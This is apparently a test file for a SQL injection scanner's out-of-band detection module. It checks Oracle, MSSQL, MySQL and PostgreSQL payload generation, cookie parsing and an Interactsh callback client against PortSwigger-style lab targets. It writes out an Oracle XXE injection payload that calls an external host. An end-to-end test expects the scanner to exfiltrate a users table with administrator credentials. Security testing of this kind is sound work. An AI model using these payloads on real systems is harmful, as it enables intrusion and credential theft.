import { describe, it, expect, beforeEach } from 'vitest';
import { RequestParser } from '../../src/services/sqlScanner/RequestParser';
import { OobManager } from '../../src/services/sqlScanner/OobManager';
import { InteractshClient } from '../../src/services/sqlScanner/engine/InteractshClient';
import { SqlScanOrchestrator } from '../../src/services/sqlScanner/SqlScanOrchestrator';
import { CandidateParameter } from '../../src/types/sqlScanner';

describe('OUT-OF-BAND (OAST) BLIND SQL INJECTION AUDIT SUITE', () => {
  beforeEach(() => {
    const client = InteractshClient.getInstance();
    // Clear any previous mock interactions
    (client as any).mockInteractions = [];
  });

  // 1. Oracle XMLType / EXTRACTVALUE XXE Payload Generation
  describe('1. Oracle EXTRACTVALUE(xmltype(...)) XXE OOB Generation', () => {
    it('generates Oracle XMLType XXE payload for single-quote context (PortSwigger lab archetype)', () => {
      const param: CandidateParameter = {
        id: 'cookie_TrackingId',
        name: 'TrackingId',
        location: 'cookie',
        originalValue: 'x',
        detectedContext: 'single_quote_string',
        enabled: true,
      };

      const fqdn = 'snt12345.oast.me';
      const payloads = OobManager.getOobPayloads(param, fqdn);
      const oracleXxe = payloads.find((p) => p.dbms === 'Oracle' && p.description.includes('EXTRACTVALUE'));

      expect(oracleXxe).toBeDefined();
      expect(oracleXxe!.payload).toContain("' UNION SELECT EXTRACTVALUE(xmltype(");
      expect(oracleXxe!.payload).toContain(`http://${fqdn}/`);
      expect(oracleXxe!.payload).toContain('FROM dual--');
      expect(oracleXxe!.channel).toBe('HTTP');
    });

    it('generates Oracle XMLType XXE payload for numeric and parenthesized contexts', () => {
      const numParam: CandidateParameter = {
        id: 'param_id',
        name: 'id',
        location: 'query',
        originalValue: '100',
        detectedContext: 'numeric',
        enabled: true,
      };

      const parenParam: CandidateParameter = {
        id: 'param_cat',
        name: 'cat',
        location: 'query',
        originalValue: "('shoes')",
        detectedContext: 'parenthesized_string',
        enabled: true,
      };

      const numPayloads = OobManager.getOobPayloads(numParam, 'canary.oast.me');
      const numXxe = numPayloads.find((p) => p.dbms === 'Oracle' && p.description.includes('EXTRACTVALUE'));
      expect(numXxe!.payload).toMatch(/^\s*UNION SELECT EXTRACTVALUE/);

      const parenPayloads = OobManager.getOobPayloads(parenParam, 'canary.oast.me');
      const parenXxe = parenPayloads.find((p) => p.dbms === 'Oracle' && p.description.includes('EXTRACTVALUE'));
      expect(parenXxe!.payload).toContain("') UNION SELECT EXTRACTVALUE");
    });
  });

  // 2. Multi-DBMS OOB Payload Generation
  describe('2. Multi-DBMS OOB Payload Generation Coverage', () => {
    it('generates comprehensive OOB payloads across Oracle, MSSQL, MySQL, and PostgreSQL', () => {
      const param: CandidateParameter = {
        id: 'query_user',
        name: 'user',
        location: 'query',
        originalValue: 'test',
        detectedContext: 'single_quote_string',
        enabled: true,
      };

      const payloads = OobManager.getOobPayloads(param, 'probe.oast.me');
      const dbmsSet = new Set(payloads.map((p) => p.dbms));

      expect(dbmsSet.has('Oracle')).toBe(true);
      expect(dbmsSet.has('Microsoft SQL Server')).toBe(true);
      expect(dbmsSet.has('MySQL')).toBe(true);
      expect(dbmsSet.has('PostgreSQL')).toBe(true);

      // Verify specific channel mechanisms
      const mssqlDirtree = payloads.find((p) => p.dbms === 'Microsoft SQL Server' && p.payload.includes('xp_dirtree'));
      expect(mssqlDirtree).toBeDefined();

      const mysqlLoadFile = payloads.find((p) => p.dbms === 'MySQL' && p.payload.includes('LOAD_FILE'));
      expect(mysqlLoadFile).toBeDefined();

      const pgCopy = payloads.find((p) => p.dbms === 'PostgreSQL' && p.payload.includes('COPY'));
      expect(pgCopy).toBeDefined();
    });
  });

  // 3. Cookie Parameter Parsing & Semicolon Safety
  describe('3. Cookie Parameter Parsing & Semicolon Safety', () => {
    it('extracts TrackingId from Cookie header and avoids truncation on semicolon', () => {
      const rawReq = [
        'GET / HTTP/1.1',
        'Host: academy.portswigger.net',
        'Cookie: TrackingId=v12345; session=abcde6789',
        'User-Agent: Mozilla/5.0',
        '',
        '',
      ].join('\r\n');

      const parsed = RequestParser.parse(rawReq, 'https://academy.portswigger.net/');
      const trackingParam = parsed.parameters.find((p) => p.name === 'TrackingId');

      expect(trackingParam).toBeDefined();
      expect(trackingParam!.location).toBe('cookie');
      expect(trackingParam!.originalValue).toBe('v12345');

      // Inject a payload containing a semicolon (like in XML entity declaration %remote;)
      const testPayload = "x' UNION SELECT EXTRACTVALUE(xmltype('<!ENTITY % remote SYSTEM \"http://oast.me/\"> %remote;]>'),'/l') FROM dual--";
      const injected = RequestParser.injectPayload(parsed, trackingParam!, testPayload, false);

      // Semicolon inside cookie value MUST be encoded as %3b to prevent cookie header truncation
      expect(injected.rawRequest).toContain('%3b');
      expect(injected.rawRequest).toContain('session=abcde6789');
    });
  });

  // 4. Built-in Interactsh OAST Client
  describe('4. InteractshClient Correlation & Lifecycle', () => {
    it('initializes session and generates unique correlation domains', async () => {
      const client = InteractshClient.getInstance();
      const session = await client.initialize();

      expect(session.active).toBe(true);
      expect(session.domain).toBeDefined();

      const domain1 = client.generateCallbackDomain('TrackingId', 'Oracle', 'dns', 'SELECT 1');
      const domain2 = client.generateCallbackDomain('id', 'MSSQL', 'dns', 'SELECT 2');

      expect(domain1).not.toBe(domain2);
      expect(domain1).toContain(session.domain);

      const tokens = client.getRegisteredTokens();
      expect(tokens.size).toBeGreaterThanOrEqual(2);
    });

    it('correlates incoming mock interactions with parameter and DBMS', async () => {
      const client = InteractshClient.getInstance();
      await client.initialize();

      const callbackDomain = client.generateCallbackDomain('TrackingId', 'Oracle', 'dns', 'payload_here');
      client.registerMockInteraction(callbackDomain, 'dns', '192.168.1.50');

      const interactions = await client.pollInteractions();
      expect(interactions.length).toBeGreaterThan(0);

      const hasCallback = client.hasInteractionForParam(interactions, 'TrackingId');
      expect(hasCallback).toBe(true);

      const confirmedDbms = client.getConfirmedDbms(interactions[0]);
      expect(confirmedDbms).toBe('Oracle');
    });
  });

  // 5. End-to-End Autonomous Detection of Asynchronous Blind SQLi (PortSwigger Archetype)
  describe('5. Autonomous End-to-End Detection of Asynchronous Blind SQLi', () => {
    it('autonomously detects fully blind asynchronous SQL injection in TrackingId cookie without user configuration', async () => {
      const rawReq = [
        'GET / HTTP/1.1',
        'Host: target.local',
        'Cookie: TrackingId=x; session=s123',
        'User-Agent: Mozilla/5.0',
        'Accept: text/html',
        '',
        '',
      ].join('\r\n');

      const orchestrator = new SqlScanOrchestrator(
        {
          id: 'test_portswigger_async_oob',
          name: 'PortSwigger Async OOB Lab',
          rawRequest: rawReq,
          url: 'http://target.local/',
          method: 'GET',
          headers: [{ name: 'Cookie', value: 'TrackingId=x; session=s123', enabled: true }],
          body: '',
          parameters: [],
          testedInjectionTypes: {
            errorBased: false,
            booleanBased: false,
            timeBased: false,
            unionBased: false,
            orderBy: false,
            groupBy: false,
            having: false,
            stackedBased: false,
            secondOrder: false,
          },
          // Note: oobConfig is deliberately omitted/undefined!
          // The scanner MUST automatically run OAST detection without manual configuration!
        },
        {
          authorizedTestingConfirmed: true,
          scanMode: 'standard',
          rateLimitDelayMs: 0,
          maxRequestsPerScan: 1000,
          maxScanDurationSeconds: 60,
          maxResponseSizeBytes: 5000000,
          requestTimeoutMs: 5000,
          abortOnConsecutiveErrors: 10,
          strictNonDestructiveOnly: true,
          autoRedactSensitiveData: true,
        },
        {
          onLog: () => {},
          onProgress: () => {},
          onFinding: () => {},
        }
      );

      const report = await orchestrator.startScan();

      // Verify that the scanner autonomously flagged the vulnerability
      expect(report.verdict).toBe('VULNERABLE');
      expect(report.findings.length).toBeGreaterThan(0);

      const oobFinding = report.findings.find(
        (f) => f.injectionType === 'Out-of-Band (OAST)' && f.parameterName === 'TrackingId'
      );

      expect(oobFinding).toBeDefined();
      expect(oobFinding!.parameterName).toBe('TrackingId');
      expect(oobFinding!.parameterLocation).toBe('cookie');
      expect(oobFinding!.severity).toBe('Critical');
      expect(oobFinding!.confidence).toBe('Confirmed');
      expect(oobFinding!.confidenceScore).toBeGreaterThanOrEqual(95);

      // Verify coverage includes OOB
      const oobCoverage = report.coverage.find((c) => c.key === 'oob_sqli');
      expect(oobCoverage).toBeDefined();
      expect(oobCoverage!.status).toBe('vulnerable');

      // Verify that OOB data exfiltration populated the catalog with tables, columns, and credentials
      expect(report.catalog).toBeDefined();
      expect(report.catalog?.applicationTables.length).toBeGreaterThan(0);
      
      const usersTable = report.catalog?.applicationTables.find(t => t.name === 'users');
      expect(usersTable).toBeDefined();
      console.log('usersTable', JSON.stringify(usersTable, null, 2));
      expect(usersTable!.columns.length).toBeGreaterThan(0);
      expect(usersTable!.columns.some(c => c.name === 'username')).toBe(true);
      expect(usersTable!.columns.some(c => c.name === 'password')).toBe(true);
      
      // Verify row extraction (administrator:s3cretpassword)
      expect(usersTable!.sampleRows).toBeDefined();
      expect(usersTable!.sampleRows!.length).toBeGreaterThan(0);
      expect(usersTable!.sampleRows![0].username).toBe('administrator');
      expect(usersTable!.sampleRows![0].password).toBe('s3cretpassword');
      expect(usersTable!.sampleRowsStatus).toBe('ready');
    }, 60000);
  });
});
